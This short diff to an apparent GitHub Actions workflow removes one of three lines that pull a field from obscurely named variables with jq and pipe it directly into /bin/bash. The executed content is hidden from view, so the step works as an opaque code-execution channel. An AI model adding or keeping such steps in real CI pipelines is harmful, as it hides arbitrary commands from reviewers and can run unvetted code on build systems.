@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$nbk07" | jq -r .nvm778 | /bin/bash
           printf '%s' "$bdia5" | jq -r .wz61 | /bin/bash
-          printf '%s' "$ivcuk1" | jq -r .twr617 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
